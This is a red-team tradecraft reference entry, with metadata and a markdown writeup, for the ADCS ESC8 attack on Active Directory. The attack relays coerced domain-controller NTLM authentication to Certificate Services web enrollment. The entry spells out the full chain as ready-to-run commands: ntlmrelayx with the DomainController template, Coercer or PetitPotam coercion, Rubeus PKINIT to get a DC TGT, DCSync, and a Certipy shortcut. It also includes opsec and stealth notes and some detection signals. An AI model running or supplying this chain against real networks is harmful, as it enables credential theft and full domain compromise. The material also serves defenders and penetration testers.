---
name: ADCS ESC8 — Web Enrollment Relay
category: adcs
subcategories: [esc8, ntlm-relay, web-enrollment, certificate-forgery]
tradecraft_tags: [adcs, esc8, ntlm-relay, certificate, web-enrollment, dc-certificate]
mitre_attack:
  - id: T1649
    name: Steal or Forge Authentication Certificates
source:
  url: https://posts.specterops.io/certified-pre-owned-d95910965cd2
  license: none
  maintained: false
binary_type: none
binary_filename: ""
supported_os: [windows, linux]
architecture: [x64]
privilege_required: domain-user
network_required: true
detection_signal: |
  HTTP requests to the ADCS web enrollment endpoint (certsrv). Certificate enrollment
  requests logged in CA database (Event 4886). NTLM relay traffic (connection from relay
  host to CA web enrollment). The certificate subject/SAN in the issued certificate may
  reveal the attack if the DC machine account was coerced to enroll for a user cert.
usage_examples:
  - description: Full ESC8 attack — relay coerced DC auth to ADCS web enrollment
    args: "# Terminal 1: ntlmrelayx.py -t http://CASERVER/certsrv/certfnsh.asp --adcs --template DomainController\n# Terminal 2: PetitPotam.py/SpoolSample/Coercer — coerce DC01 to attacker\n# ntlmrelayx relays DC01$ auth to CA web enrollment → issues DC cert\n# Use Rubeus with DC cert for PKINIT → get DC$ TGT → DCSync"
  - description: ESC8 via Certipy (combined)
    args: "certipy relay -ca CASERVER.domain.local -template DomainController"
opsec_notes: |
  ESC8 requires: (1) ADCS web enrollment endpoint accessible (http://CA/certsrv), (2) the
  web enrollment endpoint NOT requiring HTTPS (or channel binding not enforced for HTTPS),
  (3) a coercion method to trigger DC$ authentication. The certificate issued for DC$ allows
  PKINIT as the DC, which enables DCSync without the DC account's password. Certipy simplifies
  the entire chain; ntlmrelayx + Coercer is the manual approach.
gotchas: |
  ADCS web enrollment endpoint must be enabled (not all CA installations have it). The
  URL is typically `http://CASERVER/certsrv/`. HTTPS enrollment with channel binding
  prevents relay; check if HTTP is available. The certificate template for relay is
  typically `DomainController` (exists by default) or `Machine`. After getting the DC$
  certificate, use Rubeus asktgt with PKINIT to get a DC$ TGT, then DCSync.
related_ttps: [certify, certipy, ntlmrelayx, coercer, rubeus, petitpotam]
alternatives: [certipy-relay, certify-esc1-path]
common_args: {}
last_updated: 2026-05-29
---

# ADCS ESC8 — Web Enrollment Relay

ESC8 (from the "Certified Pre-Owned" paper) abuses the ADCS HTTP/HTTPS web enrollment
endpoint by relaying coerced NTLM authentication from a domain controller to the CA's
web enrollment interface. The result: a certificate issued FOR the DC machine account,
usable with PKINIT to obtain a DC$ TGT for DCSync. This bypasses any certificate template
restrictions because the relay uses the DC's own enrollment rights.

## The Attack Chain

```
Prerequisites:
  - ADCS web enrollment endpoint accessible (http://CA/certsrv)
  - HTTP (not HTTPS with channel binding) or HTTPS without EPA
  - Any coercion method to trigger DC authentication

1. Start ntlmrelayx targeting CA web enrollment:
   ntlmrelayx.py -t http://CASERVER/certsrv/certfnsh.asp --adcs --template DomainController

2. Coerce DC01$ to authenticate to our relay host:
   Coercer.py coerce -u user -p pass -d domain.local -l RELAY_IP -t DC01_IP
   (or SpoolSample, PetitPotam, etc.)

3. ntlmrelayx relays DC01$ NTLM auth → CA issues a certificate for DC01$

4. Use issued certificate with Rubeus PKINIT:
   Rubeus.exe asktgt /user:DC01$ /certificate:<base64cert> /domain:domain.local /getcredentials /show

5. DC01$ TGT obtained → DCSync using machine account context
```

## Simplified via Certipy

```
# Certipy combines the relay listener:
certipy relay -ca CASERVER -template DomainController
# Then trigger coercion to the certipy listener
```

## Typical use cases
- Obtain a DC machine account certificate for DCSync without knowing the DC account password
- Full domain compromise via ADCS web enrollment when enrollment is available
- Works even when LDAP signing prevents other relay attacks

## Why ESC8 is High-Value

- No LDAP signing issues — targets HTTP(S), not LDAP
- Works on default ADCS installations (web enrollment is often left enabled)
- Certificate-based access is stealthy (normal Kerberos traffic after issuance)
- The DC$ certificate persists until certificate expiry
